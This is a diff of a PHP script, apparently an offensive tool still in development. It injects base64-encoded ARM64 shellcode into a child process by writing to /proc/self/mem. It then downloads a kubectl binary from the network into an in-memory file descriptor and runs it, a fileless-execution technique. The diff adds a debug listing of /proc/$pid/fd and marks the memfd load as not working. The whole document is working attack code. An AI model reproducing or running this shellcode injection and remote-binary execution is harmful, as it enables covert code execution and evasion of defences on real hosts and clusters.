@@ -240,17 +240,32 @@ $status = proc_get_status($process);
 $pid = $status['pid'];
 
 # Execute shellcode in child process
-$payload = "\n".'$data = file_get_contents("/proc/self/syscall"); $data_array = explode(" ", $data); $mem_addr = trim($data_array[8]); $dec_offset = hexdec($mem_addr); $shellcode_b64 = "gCiI0qCIqPLgDx/44AMAkSEAAcroIoDSAQAA1MgFgNIBAADUiBWA0gEAANRhAoDSKBCA0gEAANQ="; $shellcode = base64_decode($shellcode_b64); $fd = fopen("/proc/self/mem", "r+"); fseek($fd,$dec_offset); fwrite($fd, $shellcode); fclose($fd);'."\n";
+$payload = "\n\n".'$data = file_get_contents("/proc/self/syscall"); $data_array = explode(" ", $data); $mem_addr = trim($data_array[8]); $dec_offset = hexdec($mem_addr); $shellcode_b64 = "gCiI0qCIqPLgDx/44AMAkSEAAcroIoDSAQAA1MgFgNIBAADUiBWA0gEAANRhAoDSKBCA0gEAANQ="; $shellcode = base64_decode($shellcode_b64); $fd = fopen("/proc/self/mem", "r+"); fseek($fd,$dec_offset); fwrite($fd, $shellcode); fclose($fd);'."\n\n";
+
 fwrite($pipes[0], $payload);
 
 sleep(0.5);
 
-# Load kubectl in memfd
-file_put_contents("/proc/$pid/fd/2", file_get_contents("https://storage.googleapis.com/kubernetes-release/release/v1.25.3/bin/linux/arm64/kubectl"));
+# Check it was created
+function listFilesInFolder($folderPath) {
+  if (is_dir($folderPath)) {
+    if ($dh = opendir($folderPath)) {
+      while (($file = readdir($dh)) !== false) {
+        echo "filename: $file : filetype: " . filetype($folderPath . $file) . "\n";
+      }
+      closedir($dh);
+    }
+  }
+}
+
+listFilesInFolder("/proc/$pid/fd/");
+
+# Load kubectl in memfd (NOT WORKING)
+file_put_contents("/proc/$pid/fd/3", file_get_contents("https://storage.googleapis.com/kubernetes-release/release/v1.25.3/bin/linux/arm64/kubectl"));
 
 # Execute kubectl
 $cmd_array_kubectl = [
-    '/proc/$pid/fd/2',
+    "/proc/$pid/fd/3",
     '-h'
 ];
 
